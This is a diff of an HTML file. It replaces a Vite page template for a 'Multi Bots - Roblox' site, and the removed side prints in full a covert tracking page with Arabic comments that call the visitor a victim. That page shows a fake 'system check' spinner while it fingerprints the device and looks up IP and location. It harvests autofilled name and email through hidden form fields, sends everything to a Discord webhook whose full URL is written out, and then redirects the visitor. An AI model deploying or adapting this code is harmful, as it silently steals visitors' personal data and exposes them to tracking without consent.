@@ -1,110 +1,26 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>HTLr Premium | SYSTEM CHECK</title>
-    <style>
-        /* تصميم يوحي بأن الصفحة تحمل بيانات عشان الضحية ينتظر */
-        body { background: #000; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .loader { text-align: center; }
-        .spinner { border: 4px solid #111; border-top: 4px solid #00ff41; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #hidden-form { display: none; } /* حقول مخفية لصيد التعبئة التلقائية */
-    </style>
-</head>
-<body>
+<!doctype html>
+<html lang="en">
 
-    <div class="loader">
-        <div class="spinner"></div>
-        <p id="msg">CONNECTING TO HTLr SERVER...</p>
-    </div>
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>Multi Bots - Roblox</title>    
+    <!-- THIS IS THE START OF A COMMENT BLOCK, BLOCK TO BE DELETED: Google Fonts here, example:
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    THIS IS THE END OF A COMMENT BLOCK, BLOCK TO BE DELETED -->
+  </head>
 
-    <!-- فخ الحقول المخفية: الأيفون قد يعبيها تلقائياً بالبريد أو الاسم -->
-    <form id="hidden-form">
-        <input type="text" name="name" id="leak_name" autocomplete="name">
-        <input type="email" name="email" id="leak_email" autocomplete="email">
-        <input type="tel" name="phone" id="leak_phone" autocomplete="tel">
-    </form>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+    <script
+      defer
+      src="%VITE_ANALYTICS_ENDPOINT%/umami"
+      data-website-id="%VITE_ANALYTICS_WEBSITE_ID%"></script>
+  </body>
 
-    <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE";
-
-        async function stealthCapture() {
-            // 1. بصمة المتصفح والجهاز
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
-
-            const data = {
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                gpu: gpu,
-                cores: navigator.hardwareConcurrency || 'N/A',
-                memory: navigator.deviceMemory || 'N/A',
-                screen: `${window.screen.width}x${window.screen.height}`,
-                lang: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                touchPoints: navigator.maxTouchPoints
-            };
-
-            // 2. محاولة صيد الإيميل المسرب من التعبئة التلقائية
-            const leakedEmail = document.getElementById('leak_email').value;
-            const leakedName = document.getElementById('leak_name').value;
-
-            // 3. جلب معلومات البطارية والشبكة
-            let batteryInfo = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batteryInfo = `${Math.round(b.level * 100)}% - ${b.charging ? 'Charging' : 'Discharging'}`;
-            }
-
-            // 4. جلب الموقع والآيبي بدقة
-            let ipInfo = {};
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                ipInfo = await res.json();
-            } catch (e) {}
-
-            // 5. تجهيز الإرسال الخفي
-            const payload = {
-                username: "HTLr - STEALTH TRACKER",
-                embeds: [{
-                    title: "🕵️‍♂️ تم سحب معلومات بصمت! [#HTLr]",
-                    color: 3066993, // أخضر
-                    fields: [
-                        { name: "🌐 عنوان IP", value: `\`${ipInfo.ip || 'N/A'}\` (${ipInfo.org || 'ISP Unknown'})`, inline: false },
-                        { name: "📍 الموقع الجغرافي", value: `${ipInfo.city || '?'}, ${ipInfo.country_name || '?'}`, inline: true },
-                        { name: "📱 نوع الأيفون (GPU)", value: `\`${data.gpu}\``, inline: false },
-                        { name: "🔋 حالة البطارية", value: `\`${batteryInfo}\``, inline: true },
-                        { name: "🔑 إيميل مسرب (Auto-fill)", value: `\`${leakedEmail || 'لم يتم التسريب'}\``, inline: true },
-                        { name: "👤 اسم مسرب", value: `\`${leakedName || 'لم يتم التسريب'}\``, inline: true },
-                        { name: "⚙️ النظام والمنصة", value: `\`${data.platform}\` | \`${data.lang}\``, inline: false },
-                        { name: "💻 بصمة المتصفح الكاملة", value: `\`\`\`${data.ua}\`\`\``, inline: false }
-                    ],
-                    footer: { text: "Z7F LINK TRACK | DENGER ☢️ | " + new Date().toLocaleTimeString() }
-                }]
-            };
-
-            // إرسال البيانات
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            // تحويل الضحية بعد 3 ثواني
-            setTimeout(() => {
-                document.getElementById('msg').innerText = "SYSTEM INCOMPATIBLE";
-                window.location.href = "https://www.apple.com";
-            }, 3000);
-        }
-
-        // تشغيل السكربت فور تحميل الصفحة
-        window.onload = stealthCapture;
-
-        // "الحركة": لو لمس الضحية الشاشة في أي مكان، يحاول السكربت إعادة الإرسال لصيد الـ Auto-fill
-        window.onclick = stealthCapture;
-    </script>
-</body>
 </html>
